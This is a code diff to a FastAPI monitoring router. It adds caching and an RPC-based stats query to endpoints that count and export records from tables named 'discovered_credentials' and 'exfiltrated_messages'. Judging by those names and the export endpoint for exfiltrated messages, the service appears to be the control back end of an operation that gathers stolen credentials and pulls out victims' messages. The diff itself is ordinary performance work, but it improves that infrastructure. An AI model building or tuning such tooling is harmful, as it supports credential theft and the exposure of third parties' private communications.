@@ -1,8 +1,9 @@
-import logging
 import csv
 import io
+import logging
+import time
 from datetime import UTC, datetime
-from typing import Any, Literal, Optional
+from typing import Any, Literal
 from urllib.parse import urlsplit, urlunsplit
 from uuid import UUID
 
@@ -16,6 +17,9 @@ from app.schemas.models import CredentialOut, MessageOut, StatsOut
 
 logger = logging.getLogger(__name__)
 
+_STATS_CACHE_TTL_SECONDS = 30
+_STATS_CACHE: tuple[float, StatsOut] | None = None
+
 router = APIRouter(
     prefix="/monitor",
     tags=["Monitor"],
@@ -26,28 +30,79 @@ router = APIRouter(
 @router.get("/stats", response_model=StatsOut)
 async def get_stats():
     """Get system stats. Requires X-Monitor-Key header."""
+    global _STATS_CACHE
+
+    now = time.monotonic()
+    if _STATS_CACHE and now - _STATS_CACHE[0] <= _STATS_CACHE_TTL_SECONDS:
+        return _STATS_CACHE[1]
+
     try:
-        c_res = db.table("discovered_credentials").select("*", count="exact").execute()
-        total_creds = c_res.count if c_res.count is not None else len(c_res.data)
-
-        ca_res = db.table("discovered_credentials").select("*", count="exact").eq("status", "active").execute()
-        active_creds = ca_res.count if ca_res.count is not None else len(ca_res.data)
-
-        m_res = db.table("exfiltrated_messages").select("*", count="exact").execute()
-        total_msgs = m_res.count if m_res.count is not None else len(m_res.data)
-
-        b_res = db.table("exfiltrated_messages").select("*", count="exact").eq("is_broadcasted", True).execute()
-        bc_msgs = b_res.count if b_res.count is not None else len(b_res.data)
-
-        return StatsOut(
-            credentials_total=total_creds,
-            credentials_active=active_creds,
-            messages_exfiltrated=total_msgs,
-            messages_broadcasted=bc_msgs
-        )
+        stats = _get_monitor_stats()
+        _STATS_CACHE = (now, stats)
+        return stats
     except Exception as exc:
+        if _STATS_CACHE:
+            logger.warning("monitor/stats query failed; serving cached stats", exc_info=True)
+            return _STATS_CACHE[1]
         logger.exception("monitor/stats query failed")
         raise HTTPException(status_code=500, detail="Internal error") from exc
+
+
+def _get_monitor_stats() -> StatsOut:
+    try:
+        stats = _get_monitor_stats_from_rpc()
+    except Exception as exc:
+        if not _is_missing_monitor_stats_rpc(exc):
+            raise
+        logger.warning("monitor stats RPC unavailable; falling back to exact narrow counts")
+        stats = None
+
+    if stats is not None:
+        return stats
+
+    return StatsOut(
+        credentials_total=_exact_count("discovered_credentials"),
+        credentials_active=_exact_count("discovered_credentials", "status", "active"),
+        messages_exfiltrated=_exact_count("exfiltrated_messages"),
+        messages_broadcasted=_exact_count("exfiltrated_messages", "is_broadcasted", True),
+    )
+
+
+def _get_monitor_stats_from_rpc() -> StatsOut | None:
+    res = db.rpc("get_monitor_stats").execute()
+    rows = res.data or []
+    row = rows[0] if isinstance(rows, list) and rows else rows if isinstance(rows, dict) else None
+    if not row:
+        return None
+    return StatsOut(
+        credentials_total=int(row.get("credentials_total") or 0),
+        credentials_active=int(row.get("credentials_active") or 0),
+        messages_exfiltrated=int(row.get("messages_exfiltrated") or 0),
+        messages_broadcasted=int(row.get("messages_broadcasted") or 0),
+    )
+
+
+def _exact_count(table: str, column: str | None = None, value: Any = None) -> int:
+    query = db.table(table).select("id", count="exact").limit(0)
+    if column is not None:
+        query = query.eq(column, value)
+    res = query.execute()
+    if res.count is not None:
+        return int(res.count)
+    return len(res.data or [])
+
+
+def _is_missing_monitor_stats_rpc(exc: Exception) -> bool:
+    text = str(exc).lower()
+    return (
+        "get_monitor_stats" in text
+        and (
+            "could not find" in text
+            or "does not exist" in text
+            or "undefined function" in text
+            or "pgrst202" in text
+        )
+    )
 
 
 @router.get("/credentials", response_model=list[CredentialOut])
@@ -116,9 +171,9 @@ async def list_messages(limit: int = 100):
 
 @router.get("/export")
 async def export_messages(
-    credential_id: Optional[UUID] = Query(None),
+    credential_id: UUID | None = Query(None),
     format: Literal["json", "csv"] = Query("json"),
-    since: Optional[datetime] = Query(None),
+    since: datetime | None = Query(None),
     limit: int = Query(1000, ge=1, le=10000),
 ):
     """Export exfiltrated messages as JSON or CSV. Filters: credential_id, since, limit."""
